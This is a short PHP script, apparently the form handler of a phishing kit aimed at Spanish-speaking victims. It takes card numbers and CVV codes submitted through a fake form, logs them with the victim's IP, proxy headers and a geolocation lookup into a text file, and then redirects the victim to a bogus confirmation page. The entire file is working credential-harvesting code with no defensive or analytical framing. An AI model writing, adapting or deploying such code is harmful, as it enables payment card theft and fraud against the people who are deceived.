<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$ip_comp = $_SERVER['HTTP_CLIENT_IP'];
$userp = $_SERVER['HTTP_X_FORWARDED'];
$proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];


$cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));


	
	$file = fopen("NEW01.txt", "a");
	
fwrite($file, 
"* TARJETA: ".$_POST['ntarjeta1']."
* CVV: ".$_POST['codigo1']."
* FECHA: ".date('Y-m-d')."
* HORA: ".date('H:i:s')."
* IP: ".$ip."
* PROXY: ".$proxy."
* IP COMPARTIDA: ".$ip_comp."
".$userp."
".$cc."
".$city."   
" . PHP_EOL);
fwrite($file, "==============================" . PHP_EOL);
fclose($file);

header("location:Confirmacion.php");

?>
